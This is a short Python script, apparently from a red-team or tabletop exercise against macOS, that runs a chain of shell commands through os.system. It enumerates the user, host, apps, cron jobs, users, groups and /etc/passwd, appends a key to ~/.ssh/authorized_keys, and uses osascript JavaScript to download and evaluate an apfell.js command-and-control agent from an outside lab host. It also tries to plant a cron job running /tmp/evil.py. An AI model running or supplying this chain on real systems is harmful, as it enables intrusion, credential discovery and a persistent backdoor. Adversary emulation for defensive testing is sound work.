import os
os.system('whoami')
os.system('hostname')
os.system('lsappinfo list')
os.system('crontab -l')
os.system('dscacheutil -q user')
os.system('dscl . ls /Groups')
os.system('cat /etc/passwd')
os.system('echo "tabletop_key_value" >> ~/.ssh/authorized_keys')
os.system("osascript -l JavaScript -i eval(ObjC.unwrap( $.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://sec-lab-kali.test.env:2222/apfell.js')),$.NSUTF8StringEncoding )));")
os.system('echo "* * * * * /bin/bash -c \"/tmp/evil.py\"" | crontab -l') #for deletion >crontab -r
